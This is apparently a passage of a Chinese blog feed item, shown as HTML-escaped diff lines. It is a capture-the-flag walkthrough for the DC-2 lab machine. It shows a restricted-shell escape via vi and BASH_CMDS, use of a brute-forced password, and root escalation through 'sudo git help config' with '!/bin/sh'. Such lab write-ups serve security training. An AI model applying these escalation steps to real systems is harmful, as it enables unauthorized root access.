-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;less
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;发现有个vi,用这个命令打开该文件&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi flag3.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;拿到flag3&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;意思：&lt;/p&gt;
-&lt;p&gt;可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。&lt;/p&gt;
-&lt;h2 id=&#34;flag4&#34;&gt;flag4
-&lt;/h2&gt;&lt;p&gt;提示：大概意思就是提权&lt;/p&gt;
-&lt;p&gt;打开一个文件，用vi去编辑，然后提权&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi flag3.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:set shell=/bin/sh
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;:shell
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd ..
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;该目录下有 tom和jerry&lt;/p&gt;
-&lt;p&gt;到jerry用户下面&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd jerry
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi flag4.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;flag4.txt&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;ood to see that you&amp;rsquo;ve made it this far - but you&amp;rsquo;re not home yet.
-You still need to get the final flag (the only flag that really counts!!!).
-No hints here - you&amp;rsquo;re on your own now. :-)
-Go on - git outta here!!!!&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;flag5&#34;&gt;flag5
-&lt;/h2&gt;&lt;p&gt;切换到jerry用户下面&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BASH_CMDS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;su&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;su&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;xport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;usr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;su&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;jerry&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;输入&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jerry的密码&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，前面收集爆破到的密码&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;三提权&#34;&gt;三、提权
-&lt;/h2&gt;&lt;p&gt;使用git提权即可&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo git help config
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#这边直接输下面的命令，不用打：
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;!/bin/sh
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;su
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd /root
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat final-flag.txt
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;flag5&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Congratulatons!!!
-A special thanks to all those who sent me tweets
-and provided me with feedback - it&amp;rsquo;s all greatly
-appreciated.
-If you enjoyed this CTF, send me a tweet via @DCAU7.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;总结&#34;&gt;总结：
-&lt;/h1&gt;&lt;p&gt;希望对大家有帮助&lt;/p&gt;
-</description>
         </item>
         <item>
         <title>Links</title>
